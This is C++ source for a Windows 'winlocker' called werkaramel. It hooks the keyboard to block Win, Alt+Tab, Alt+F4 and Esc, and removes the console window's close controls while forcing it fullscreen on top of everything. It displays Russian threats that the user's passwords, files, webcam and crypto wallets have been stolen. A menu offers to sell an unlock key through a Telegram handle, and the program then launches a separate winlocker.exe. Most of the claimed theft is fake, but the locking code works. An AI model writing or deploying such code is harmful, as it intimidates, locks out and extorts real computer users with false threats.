// language: C++, file: werkaramel.cpp, target: Windows 11 x64, MSVC
// werkaramel - eye scene + red text + menu + winlocker
#include <windows.h>
#include <shellapi.h>
#include <string>
#include <thread>
#include <chrono>
#include <random>

const std::wstring PASS = L"123";
const std::wstring LOCKER_EXE = L"winlocker.exe";

int g_phase = 0;
std::wstring g_typed;
size_t g_type_pos = 0;
std::wstring g_input;
bool g_unlocked = false;
bool g_timeout_triggered = false;
HHOOK g_kbHook = nullptr;
HANDLE g_hOut = INVALID_HANDLE_VALUE;
HANDLE g_hIn = INVALID_HANDLE_VALUE;
HWND g_hCon = nullptr;
std::mt19937 g_rng(std::random_device{}());

int RandInt(int lo, int hi) {
    std::uniform_int_distribution<int> d(lo, hi);
    return d(g_rng);
}

// ── forward declarations ────────────────────────────────────
void WOut(const std::wstring& s);
void SetColor(WORD attr);
void Gotoxy(int x, int y);

// ── тексты ──────────────────────────────────────────────────
const std::wstring SCENE_TEXT =
    L"не пытайтесь что-то сделать сейчас. будет хуже.\n"
    L"\n"
    L"вы скачали winlocker werkaramel. это не игрушка.\n"
    L"уже поздно. всё что нужно — сделано.\n"
    L"\n"
    L"все ваши данные скопированы. пароли, файлы, фото, переписки.\n"
    L"всё это уже на нашем сервере.\n"
    L"\n"
    L"не выключайте компьютер. не трогайте диспетчер задач.\n"
    L"не пытайтесь снять задачу. система отслеживает любые действия.\n"
    L"\n"
    L"попытка закрыть это окно = немедленная блокировка.\n"
    L"попытка перезагрузить = потеря данных навсегда.\n"
    L"\n"
    L"оставайтесь на месте. дальнейшие инструкции появятся ниже.";

const std::wstring TIMEOUT_SCARE =
    L"> система обнаружила подозрительную неактивность\n"
    L"> попытка обхода зарегистрирована\n"
    L"> эскалирование до фазы 2\n"
    L"\n"
    L"> загружен модуль шифрования: werka_crypt_v3\n"
    L"> ключ шифрования сгенерирован: 0x7F3A9C2E...\n"
    L"> сканирование C:\\Users\\ на секретные файлы\n"
    L"> индексация документов, фото, паролей\n"
    L"> проиндексировано: 14,847 файлов / 6.2 GB\n"
    L"> загрузка на удаленный сервер: 194.62.xx.xx\n"
    L"> загрузка завершена. 100%\n"
    L"\n"
    L"> отключение диспетчера задач\n"
    L"> отключение восстановления системы\n"
    L"> блокировка загрузчика\n"
    L"> запись с веб-камеры\n"
    L"> перехват нажатий клавиш\n"
    L"> захват буфера обмена\n"
    L"> копирование паролей браузера\n"
    L"> кража крипто-кошельков\n"
    L"> доступ к сессиям telegram\n"
    L"> экспорт контактов\n"
    L"\n"
    L"> все ключи безопасности инвалидированы\n"
    L"> резервное копирование отключено\n"
    L"> восстановление невозможно\n"
    L"\n"
    L"> ваше устройство теперь под нашим контролем\n"
    L"> не пытайтесь отключить компьютер\n"
    L"> не пытайтесь отсоединить сеть\n"
    L"> не поддавайтесь панике\n"
    L"\n"
    L"> переход к постоянной блокировке...\n"
    L"> 3...\n"
    L"> 2...\n"
    L"> 1...\n"
    L"\n"
    L"> БЛОКИРОВКА";

// ── глаз ────────────────────────────────────────────────────
const std::wstring EYE_ART =
    L"⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣾⣿⣿⣿⣿⣿⣿⣷⣶⣤⣀⠀⠀⠀⠀⠀⠀\n"
    L"⠀⠀⠀⠀⣠⣾⡿⠋⣽⣿⡿⠋⠉⠀⠀⠉⠙⢿⣿⣏⠻⣿⣦⡀⠀⠀⠀\n"
    L"⠀⠀⣰⣿⡟⠁⠀⣼⣿⠏⠀⠀⢀⣤⣤⡀⠀⠀⢻⣿⣧⠀⠈⢿⣷⡀⠀\n"
    L"⢀⣾⣟⠁⠀⠀⢸⣿⣿⠀⠀⠀⢿⣿⣿⡿⠀⠀⠀⣿⣿⡇⠀⠀⠙⣿⣆\n"
    L"⠀⠹⣿⣷⣄⠀⠈⣿⣿⣆⠀⠀⠀⠉⠉⠀⠀⠀⣸⣿⣿⠁⠀⢀⣾⣿⠏\n"
    L"⠀⠀⠀⠙⠻⣿⣦⡈⢿⣿⣷⣄⠀⠀⠀⢀⣠⣾⣿⡿⢁⣠⣾⡿⠋⠀⠀\n"
    L"⠀⠀⠀⠀⠀⠀⠈⠙⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠛⠁⠀⠀⠀⠀";

void PrintEyeCentered(WORD color) {
    SetColor(color);
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    GetConsoleScreenBufferInfo(g_hOut, &csbi);
    int cols = csbi.dwSize.X;
    int rows = csbi.dwSize.Y;

    int startY = rows / 2 - 6;
    int startX = (cols - 42) / 2;

    int col = startX, row = startY;
    for (wchar_t c : EYE_ART) {
        if (c == L'\n') { col = startX; row++; Gotoxy(col, row); }
        else { Gotoxy(col, row); WOut(std::wstring(1, c)); col++; }
    }
}

void LaunchLocker() {
    wchar_t self[MAX_PATH]{};
    GetModuleFileNameW(nullptr, self, MAX_PATH);
    std::wstring dir(self);
    size_t p = dir.find_last_of(L"\\/");
    if (p != std::wstring::npos) dir = dir.substr(0, p + 1);
    std::wstring full = dir + LOCKER_EXE;
    ShellExecuteW(nullptr, L"open", full.c_str(), nullptr, dir.c_str(), SW_SHOW);
}

LRESULT CALLBACK KbHook(int code, WPARAM wp, LPARAM lp) {
    if (code == HC_ACTION && !g_unlocked) {
        auto* kb = (KBDLLHOOKSTRUCT*)lp;
        DWORD vk = kb->vkCode;
        if (vk == VK_LWIN || vk == VK_RWIN) return 1;
        if (vk == VK_TAB && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
        if (vk == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
        if (vk == VK_ESCAPE) return 1;
        if (vk == VK_F11) return 1;
        if (g_phase == 0 || g_phase == 1 || g_phase == 2) return 1;
    }
    return CallNextHookEx(g_kbHook, code, wp, lp);
}

void WOut(const std::wstring& s) {
    DWORD w = 0;
    WriteConsoleW(g_hOut, s.c_str(), (DWORD)s.size(), &w, nullptr);
}
void SetColor(WORD attr) { SetConsoleTextAttribute(g_hOut, attr); }
void ClearScreen() {
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    DWORD cells, w;
    COORD home = {0, 0};
    GetConsoleScreenBufferInfo(g_hOut, &csbi);
    cells = csbi.dwSize.X * csbi.dwSize.Y;
    FillConsoleOutputCharacterW(g_hOut, L' ', cells, home, &w);
    FillConsoleOutputAttribute(g_hOut, 0, cells, home, &w);
    SetConsoleCursorPosition(g_hOut, home);
}
void Gotoxy(int x, int y) {
    COORD c{ (SHORT)x, (SHORT)y };
    SetConsoleCursorPosition(g_hOut, c);
}

BOOL WINAPI CtrlHandler(DWORD type) {
    if (type == CTRL_C_EVENT) return TRUE;
    return FALSE;
}

void LockConsole() {
    LONG style = GetWindowLong(g_hCon, GWL_STYLE);
    style &= ~(WS_CAPTION | WS_THICKFRAME | WS_MINIMIZEBOX |
               WS_MAXIMIZEBOX | WS_SYSMENU);
    SetWindowLong(g_hCon, GWL_STYLE, style);
    HMENU menu = GetSystemMenu(g_hCon, FALSE);
    if (menu) {
        DeleteMenu(menu, SC_CLOSE, MF_BYCOMMAND);
        DeleteMenu(menu, SC_MINIMIZE, MF_BYCOMMAND);
        DeleteMenu(menu, SC_MAXIMIZE, MF_BYCOMMAND);
    }
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    SetWindowPos(g_hCon, HWND_TOPMOST, 0, 0, sw, sh,
                 SWP_FRAMECHANGED | SWP_SHOWWINDOW);
    SetConsoleCtrlHandler(CtrlHandler, TRUE);
}

void PrintTyped() {
    SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
    Gotoxy(2, 2);
    int col = 2, row = 2;
    for (size_t i = 0; i < g_typed.size(); ++i) {
        wchar_t c = g_typed[i];
        if (c == L'\n') { col = 2; row++; Gotoxy(col, row); }
        else { WOut(std::wstring(1, c)); col++; }
    }
}

void PrintGlitch() {
    const wchar_t* noise = L"!@#$%^&*()_+-=[]{}|;:,.<>?/\\~`01";
    int nlen = (int)wcslen(noise);
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    GetConsoleScreenBufferInfo(g_hOut, &csbi);
    int cols = csbi.dwSize.X, rows = csbi.dwSize.Y;
    ClearScreen();
    for (int i = 0; i < 120; ++i) {
        Gotoxy(RandInt(0, cols - 1), RandInt(0, rows - 1));
        SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
        WOut(std::wstring(1, noise[RandInt(0, nlen - 1)]));
    }
}

void PrintMenu() {
    ClearScreen();
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    GetConsoleScreenBufferInfo(g_hOut, &csbi);
    int cols = csbi.dwSize.X;
    int rows = csbi.dwSize.Y;

    const wchar_t* banner[] = {
        L"██╗    ██╗███████╗██████╗ ██╗  ██╗ █████╗ ██████╗  █████╗ ███╗   ███╗███████╗██╗",
        L"██║    ██║██╔════╝██╔══██╗██║ ██╔╝██╔══██╗██╔══██╗██╔══██╗████╗ ████║██╔════╝██║",
        L"██║ █╗ ██║█████╗  ██████╔╝█████╔╝ ███████║██████╔╝███████║██╔████╔██║█████╗  ██║",
        L"██║███╗██║██╔══╝  ██╔══██╗██╔═██╗ ██╔══██║██╔══██╗██╔══██║██║╚██╔╝██║██╔══╝  ██║",
        L"╚███╔███╔╝███████╗██║  ██║██║  ██╗██║  ██║██║  ██║██║  ██║██║ ╚═╝ ██║███████╗███████╗",
        L" ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝",
    };

    SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    int baseY = 1;
    for (int i = 0; i < 6; ++i) {
        Gotoxy(2, baseY + i);
        WOut(banner[i]);
    }
    Gotoxy(14, baseY + 7);
    WOut(L"W I N L O C K E R");

    std::wstring line(60, L'=');
    Gotoxy(2, baseY + 9);
    WOut(line);

    SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
    Gotoxy(2, baseY + 11);
    WOut(L"Выберите действие:");

    SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    Gotoxy(2, baseY + 13); WOut(L"[ 1 ]   Поддержка  ->  tg @werkaramel");
    Gotoxy(2, baseY + 14); WOut(L"[ 2 ]   Купить ключ");
    Gotoxy(2, baseY + 15); WOut(L"[ 3 ]   Выйти");

    SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
    std::wstring hint = L"введите число и нажмите Enter";
    Gotoxy(2, rows - 4); WOut(hint);

    SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    Gotoxy(2, rows - 2); WOut(L"> ");

    SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
    WOut(g_input + L"  ");
}

void PrintTimeoutScare() {
    ClearScreen();
    PrintEyeCentered(FOREGROUND_RED | FOREGROUND_INTENSITY);

    CONSOLE_SCREEN_BUFFER_INFO csbi;
    GetConsoleScreenBufferInfo(g_hOut, &csbi);
    int cols = csbi.dwSize.X;
    int rows = csbi.dwSize.Y;

    SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
    std::wstring msg = L"вы долго думаете...";
    Gotoxy((cols - (int)msg.size()) / 2, rows / 2 + 4);
    WOut(msg);

    std::this_thread::sleep_for(std::chrono::seconds(1));

    ClearScreen();
    int col = 2;
    int row = 1;
    Gotoxy(col, row);

    for (wchar_t c : TIMEOUT_SCARE) {
        if (c == L'\n') {
            col = 2; row++;
            Gotoxy(col, row);
        } else {
            WOut(std::wstring(1, c));
            col++;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(5));
    }
}

DWORD WINAPI SceneThread(LPVOID) {
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);
    LockConsole();

    CONSOLE_FONT_INFOEX cfi{};
    cfi.cbSize = sizeof(cfi);
    cfi.dwFontSize.Y = 18;
    cfi.dwFontSize.X = 9;
    wcscpy_s(cfi.FaceName, L"Consolas");
    SetCurrentConsoleFontEx(g_hOut, FALSE, &cfi);

    g_phase = 0;
    ClearScreen();

    CONSOLE_SCREEN_BUFFER_INFO csbi0;
    GetConsoleScreenBufferInfo(g_hOut, &csbi0);
    int cols0 = csbi0.dwSize.X;
    int rows0 = csbi0.dwSize.Y;

    PrintEyeCentered(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);

    SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
    std::wstring m1 = L"ВАС ЗАМЕТИЛИ";
    Gotoxy((cols0 - (int)m1.size()) / 2, rows0 / 2 + 4);
    WOut(m1);

    std::this_thread::sleep_for(std::chrono::seconds(2));

    g_phase = 1;
    ClearScreen();
    auto start = std::chrono::steady_clock::now();
    while (g_type_pos < SCENE_TEXT.size()) {
        g_typed += SCENE_TEXT[g_type_pos++];
        PrintTyped();
        std::this_thread::sleep_for(std::chrono::milliseconds(40));
    }
    auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
        std::chrono::steady_clock::now() - start).count();
    if (elapsed < 2000)
        std::this_thread::sleep_for(std::chrono::milliseconds(2000 - elapsed));

    g_phase = 2;
    for (int i = 0; i < 15; ++i) {
        PrintGlitch();
        std::this_thread::sleep_for(std::chrono::milliseconds(80));
    }

    g_phase = 3;
    PrintMenu();
    return 0;
}

DWORD WINAPI InputThread(LPVOID) {
    INPUT_RECORD rec;
    DWORD read = 0;
    auto menu_start = std::chrono::steady_clock::now();
    bool menu_started = false;

    while (!g_unlocked) {
        if (g_phase == 3 && !g_timeout_triggered) {
            if (!menu_started) {
                menu_start = std::chrono::steady_clock::now();
                menu_started = true;
            }
            auto el = std::chrono::duration_cast<std::chrono::seconds>(
                std::chrono::steady_clock::now() - menu_start).count();
            if (el >= 30) {
                g_timeout_triggered = true;
                g_phase = 6;
                PrintTimeoutScare();
                LaunchLocker();
                std::this_thread::sleep_for(std::chrono::seconds(2));
                ExitProcess(0);
            }
        }

        if (!ReadConsoleInputW(g_hIn, &rec, 1, &read)) {
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
            continue;
        }
        if (rec.EventType != KEY_EVENT) continue;
        if (!rec.Event.KeyEvent.bKeyDown) continue;

        wchar_t c = rec.Event.KeyEvent.uChar.UnicodeChar;
        if (c == 0) continue;

        if (g_phase == 3) {
            menu_start = std::chrono::steady_clock::now();
            if (c >= L'0' && c <= L'9') {
                g_input += c;
                PrintMenu();
            } else if (c == L'\b') {
                if (!g_input.empty()) g_input.pop_back();
                PrintMenu();
            } else if (c == L'\r') {
                if (g_input == L"1" || g_input == L"2" || g_input == L"3") {
                    g_input.clear();
                    g_unlocked = true;
                    UnhookWindowsHookEx(g_kbHook);
                    LaunchLocker();
                    std::this_thread::sleep_for(std::chrono::seconds(2));
                    ExitProcess(0);
                } else {
                    g_input.clear();
                    PrintMenu();
                }
            }
        }
    }
    return 0;
}

int wmain() {
    g_hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    g_hIn = GetStdHandle(STD_INPUT_HANDLE);
    g_hCon = GetConsoleWindow();
    ShowWindow(g_hCon, SW_SHOW);
    SetForegroundWindow(g_hCon);

    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, KbHook,
                                  GetModuleHandleW(nullptr), 0);

    CreateThread(nullptr, 0, SceneThread, nullptr, 0, nullptr);
    CreateThread(nullptr, 0, InputThread, nullptr, 0, nullptr);

    MSG m;
    while (GetMessageW(&m, nullptr, 0, 0)) {
        TranslateMessage(&m);
        DispatchMessageW(&m);
    }
    return 0;
}
